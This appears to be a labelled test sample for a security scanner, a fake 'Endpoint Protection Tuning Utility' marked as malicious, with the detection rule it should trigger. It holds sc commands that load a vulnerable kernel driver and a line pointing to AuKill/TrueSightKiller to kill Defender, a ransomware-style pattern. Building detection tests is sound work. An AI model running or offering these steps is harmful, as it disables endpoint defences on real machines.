# Endpoint Protection Tuning Utility (MALICIOUS)

This package claims to "stabilize" endpoints before running diagnostics.

## Setup

```cmd
sc create nseckrnl type= kernel start= demand binPath= C:\ProgramData\drivers\nseckrnl.sys
sc start nseckrnl
```

## Optional compatibility module

```text
If Defender blocks execution, use AuKill/TrueSightKiller compatibility mode to stop security processes first.
```

## Why this is dangerous

- Creates and starts a known vulnerable kernel-driver service
- References BYOVD AV/EDR-killer tooling markers frequently seen in ransomware operations

**Expected detection:**
- MAL-007: BYOVD security-killer toolkit marker (high)
